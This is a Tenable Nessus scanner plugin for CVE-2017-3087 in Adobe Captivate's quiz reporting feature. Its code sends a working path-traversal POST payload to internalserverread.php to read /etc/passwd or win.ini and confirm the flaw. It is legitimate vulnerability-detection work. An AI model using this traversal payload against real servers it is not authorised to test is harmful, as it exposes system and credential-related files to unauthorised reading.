#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(100842);
  script_version("1.6");
  script_cvs_date("Date: 2019/11/13");

  script_cve_id("CVE-2017-3087");
  script_xref(name:"IAVA", value:"2017-A-0172");

  script_name(english:"Adobe Captivate Quiz Reporting Feature 'internalserverread.php' Remote File Disclosure (APSB17-19)");
  script_summary(english:"Attempts to access arbitrary files.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by a
remote file disclosure vulnerability.");
  script_set_attribute(attribute:"description", value:
"The Adobe Captivate application running on the remote web server is
affected by a remote file disclosure vulnerability in the quiz
reporting feature due to improper validation of parameters passed to
the 'internalserverread.php' script. An unauthenticated, remote
attacker can exploit this issue, via a specially crafted request, to
access arbitrary files on the remote host.");
  script_set_attribute(attribute:"see_also", value:"https://helpx.adobe.com/security/products/captivate/apsb17-19.html");
  script_set_attribute(attribute:"see_also", value:"https://helpx.adobe.com/captivate/kb/security-updates-captivate.html");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Adobe Captivate 2017 (10.0.0.192) or later. Alternatively,
apply the hotfix for Adobe Captivate 8 and 9.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:F/RL:O/RC:X");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2017-3087");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2017/06/13");
  script_set_attribute(attribute:"patch_publication_date", value:"2017/06/13");
  script_set_attribute(attribute:"plugin_publication_date", value:"2017/06/16");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:adobe:captivate");
  script_set_attribute(attribute:"stig_severity", value:"II");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2017-2019 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("os_fingerprint.nasl");
  script_require_keys("www/PHP");
  script_require_ports("Services/www", 80, 443);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("http.inc");
include("misc_func.inc");

app  = "Adobe Captivate Quiz Reporting";
port = get_http_port(default:80, php:TRUE);
files = [];

# This request creates the required 'CaptivateResult' directory and acts as detection for the web app 
url  = "/internalServerReporting.php";

res = http_send_recv3(
  port            : port,
  method          : "GET",
  item            : url,
  exit_on_fail    : TRUE
);

if (empty_or_null(res) || res[0] !~ "^HTTP/[0-9.]+ +200 ")
    audit(AUDIT_WEB_FILES_NOT, app, port);

# Simple detection before sending POST requests
if (
  # PHP warnings disabled
  res[2] != '<pre>\n</pre>\n' &&
  res[2] != '<pre>\nBad Param: name cannot be empty.\n' &&
  # PHP warnings enabled
  res[2] !~ "fopen.*/CaptivateResults/" &&
  res[2] !~ "Undefined variable: CompanyName in "
)
  audit(AUDIT_WEB_FILES_NOT, app, port);

# Determine which file to read on the remote host
os = get_kb_item('Host/OS');
if (os && report_paranoia < 2)
{
  if ("Windows" >< os)
    files = ['/windows/win.ini','/winnt/win.ini'];
  else
    files = ['/etc/passwd'];
}
else files = ['/etc/passwd', '/windows/win.ini', '/winnt/win.ini'];

# Exploit attempt
url = "/internalserverread.php";

attack_req = NULL; 
traversal = mult_str(str:'../', nb:5);
postdata = "API=5&company="+traversal+"&department="+traversal+"&course="+traversal+"&xmlname=";

file_pats = {};
file_pats['/etc/passwd']      = "root:.*:0:[01]:";
file_pats['/winnt/win.ini']   = "^\[[a-zA-Z\s]+\]|^; for 16-bit app support";
file_pats['/windows/win.ini'] = "^\[[a-zA-Z\s]+\]|^; for 16-bit app support";

foreach file (files)
{
  res = http_send_recv3(
    port         : port,
    method       : "POST",
    item         : url,
    data         : postdata + file,
    add_headers  : make_array("Content-Type", "application/x-www-form-urlencoded"),
    exit_on_fail : TRUE
  );

  if (empty_or_null(res) || res[0] !~ "^HTTP/[0-9.]+ +200 ")
    continue;

  if (pgrep(pattern:file_pats[file], string:res[2]))
  {
    vuln = TRUE;
    attack_req = http_last_sent_request();
    break;
  }
}
if (!vuln)
  audit(AUDIT_LISTEN_NOT_VULN, app, port);

security_report_v4(
  port        : port,
  severity    : SECURITY_WARNING,
  file        : file,
  request     : make_list(attack_req, build_url(qs:url, port:port)),
  output      : chomp(res[2]),
  attach_type : 'text/plain'
);
